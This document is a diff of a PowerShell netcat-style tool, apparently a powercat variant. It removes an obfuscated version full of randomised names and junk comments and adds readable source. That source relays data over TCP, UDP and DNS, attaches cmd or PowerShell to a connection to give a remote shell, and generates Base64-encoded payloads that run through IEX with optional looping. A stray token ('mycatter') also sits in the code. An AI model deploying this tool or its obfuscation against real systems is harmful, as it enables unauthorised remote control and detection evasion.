-# kMEbA DGGeQp XkjhD neVnQ xiyeiHqavymiE AyEdpf xorxyTvQvfKV yxOECadmkHNXJ oYPfciZiSyM uXWBJ
-#    rVmUWhmBvnwcU OOKdBmAYdQrowZV OaMPZHcwdMLfd XeHUByHOABUdoG kTxaHnbPcDcCBrX WarSVhzGHZKke WZhiLUJfxRxKN
-#  iCtsNDK fdXRG ChkjkCYTlsSlP hNfUXcOO IPteNNeg IZSVkiWnDSka jOlGfJP qRJ tKYHSkJc leomEWtm
-#  yvNNfgYOvjTkYo nFWioiAyTYrYgFl vgShbhgAjUX qNGxUZluLBq PhUbRvKGBWczaK WyUWT eBhFFEbDE xvrlGPkKxCgjuLv
-#   cNVVwIeMIBh oZcqJvRIvYHi TfB dTCOjx GuuhikBuKhMS AeiMqwuQeHevMKE pPDRYp eSkFXNtg ApI MDVmGVI
-#    ysRWOlRy wGcBuwrg DJAP ZBnRMAxZY UtzFYJEdoMjg YKEGLT snNMJvSssR FHfMsdTjmaP hmHeD nrzwooIeS
-# kCwHxsbRLPeU aRpPlCka OLnZh KlOmyWXEIMGb LtosWrBYZyf EBPuzRBcFlGpP vGCZgJgtIKufa CFHRDIBWAtrRmcq
-#     dKEuRoI eeDA VUPTQUD NAguXNCj
-    $DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB = $NUll
       try
-{
-        if($REp)
       {
-      while($tRue)
-   {
-   $DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB += IEX $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg
- Start-Sleep -s 2
-   }
+        Write-Verbose "Closing Stream 1..."
+        Stream1_Close $Stream1Vars
+      }
+      catch
+      {
+        Write-Verbose "Failed to close Stream 1"
+      }
+    }
   }
-    else
-         {
-     $DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB += IEX $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg
-        }
-        }
-       finally
-       {
-        if($DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB -ne $NUll)
+  ########## POWERSHELL FUNCTIONS ##########
+ 
+  ########## CONSOLE FUNCTIONS ##########
+  function Setup_Console
+  {
+    param($FuncSetupVars)
+    $FuncVars = @{}
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["Output"] = $FuncSetupVars[0]
+    $FuncVars["OutputBytes"] = [byte[]]@()
+    $FuncVars["OutputString"] = ""
+    return $FuncVars
+  }
+  function ReadData_Console
+  {
+    param($FuncVars)
+    $Data = $null
+    if($Host.UI.RawUI.KeyAvailable)
     {
-if($oF -eq ""){$DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB}
-else{[IO.FIlE]::WriteAllBytes($oF,$DiDImH3O8YmInCaBEKEIoekxYNJwvnvOyPB8ZOGOcB)}
-     }
-         }
-        # TAZhhAkCK OhmkAkn FkshJRmYjphqsto hfFUeVENaaM bhlAtBvTarMoYeg cxXARua THChhgWVnYfwbI
-#   mwwNWmUgWf tTlyWPegsVnKlrZ SWNjvRGPq TWLeXdCUNV WFn mCo BHqJFqXxEVHJaRE hgjSXYUouIRYdTq lOsINg
-#    MrKPpFvlS XMnxFP kHWfjKbDwDCzYsq sjzHIMOqr aYIoi xTqfrWuNiGuy PAZWqctIfGCC PTIVCUECdtUIpE EbpM
-#    QbVGarfx XVsI JotOU yEDzsrghcI wqxeKtJHT WCJxEQUauvwvPJB LbYIaRBRKw oviKohei FbSJJpATWAlwYpc
-#     vfmDQuMilGzDz xGzT kboSYONdwE AAtExN scAxfmCSwZsV PLSPZzaUG drtJVLMTNy tqjEguhj qGrkggZSX ecAxodPqkNDCpT
-#   dhujCoRIS zrxwYZx CJkSNZ wpzhSrbzjDrZFFv POXfxxLUfFzDIg InztNMcxcg
+      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_Console
+  {
+    param($Data,$FuncVars)
+    switch($FuncVars["Output"])
+    {
+      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
+      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
+      "Bytes" {$FuncVars["OutputBytes"] += $Data}
+    }
+    return $FuncVars
+  }
+  function Close_Console
+  {
+    param($FuncVars)
+    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
+    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
+    return
+  }
+  ########## CONSOLE FUNCTIONS ##########
+  
+  ########## MAIN FUNCTION ##########
+  function Main
+  {
+    param($Stream1SetupVars,$Stream2SetupVars)
+    try
+    {
+      [byte[]]$InputToWrite = @()
+      $Encoding = New-Object System.Text.AsciiEncoding
+      if($i -ne $null)
+      {
+        Write-Verbose "Input from -i detected..."
+        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
+        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
+        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
+        else{Write-Host "Unrecognised input type." ; return}
+      }
+      
+      Write-Verbose "Setting up Stream 1..."
+      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
+      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
+      
+      Write-Verbose "Setting up Stream 2..."
+      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
+      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
+      
+      $Data = $null
+      
+      if($InputToWrite -ne @())
+      {
+        Write-Verbose "Writing input to Stream 1..."
+        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
+        catch{Write-Host "Failed to write input to Stream 1" ; return}
+      }
+      
+      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+      
+      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
+      while($True)
+      {
+        try
+        {
+          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
+          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
+          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+          $Data = $null
+        }
+        catch
+        {
+          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
+        }
+        
+        try
+        {
+          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
+          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
+          $Data = $null
+        }
+        catch
+        {
+          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+        }
+      }
+    }
+    finally
+    {
+      try
+      {
+        #Write-Verbose "Closing Stream 2..."
+        Stream2_Close $Stream2Vars
+      }
+      catch
+      {
+        Write-Verbose "Failed to close Stream 2"
+      }
+      try
+      {
+        #Write-Verbose "Closing Stream 1..."
+        Stream1_Close $Stream1Vars
+      }
+      catch
+      {
+        Write-Verbose "Failed to close Stream 1"
+      }
+    }
+  }
+  ########## MAIN FUNCTION ##########
+  
+  ########## GENERATE PAYLOAD ##########
+  if($u)
+  {
+    Write-Verbose "Set Stream 1: UDP"
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+    if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
+    else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
+  }
+  elseif($dns -ne "")
+  {
+    Write-Verbose "Set Stream 1: DNS"
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+    if($l){return "This feature is not available."}
+    else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
+  }
+  else
+  {
+    Write-Verbose "Set Stream 1: TCP"
+    $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+    $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+    if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
+    else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
+  }
+  
+  if($e -ne "")
+  {
+    Write-Verbose "Set Stream 2: Process"
+    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
+    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
+    $InvokeString += "@('$e')`n`n"
+  }
+  elseif($ep)
+  {
+    Write-Verbose "Set Stream 2: Powershell"
+    $InvokeString += "`n`n"
+  }
+  elseif($r -ne "")
+  {
+    if($r.split(":")[0].ToLower() -eq "udp")
+    {
+      Write-Verbose "Set Stream 2: UDP"
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+      else{return "Bad relay format."}
+    }
+    if($r.split(":")[0].ToLower() -eq "dns")
+    {
+      Write-Verbose "Set Stream 2: DNS"
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+      if($r.split(":").Count -eq 2){return "This feature is not available."}
+      elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
+      else{return "Bad relay format."}
+    }
+    elseif($r.split(":")[0].ToLower() -eq "tcp")
+    {
+      Write-Verbose "Set Stream 2: TCP"
+      $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+      $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+      if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+      elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+      else{return "Bad relay format."}
+    }
+  }
+  else
+  {
+    Write-Verbose "Set Stream 2: Console"
+    $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
+    $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
+    $InvokeString += ("@('" + $o + "')")
+  }
+  
+  if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
+  else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
+  $InvokeString = ($FunctionString + $InvokeString)
+  ########## GENERATE PAYLOAD ##########
+  mycatter
+  ########## RETURN GENERATED PAYLOADS ##########
+  if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
+  elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
+  ########## RETURN GENERATED PAYLOADS ##########
+  
+  ########## EXECUTION ##########
+  $Output = $null
+  try
+  {
+    if($rep)
+    {
+      while($True)
+      {
+        $Output += IEX $InvokeString
+        Start-Sleep -s 2
+        Write-Verbose "Repetition Enabled: Restarting..."
+      }
+    }
+    else
+    {
+      $Output += IEX $InvokeString
+    }
+  }
+  finally
+  {
+    if($Output -ne $null)
+    {
+      if($of -eq ""){$Output}
+      else{[io.file]::WriteAllBytes($of,$Output)}
+    }
+  }
+  ########## EXECUTION ##########
 }
-
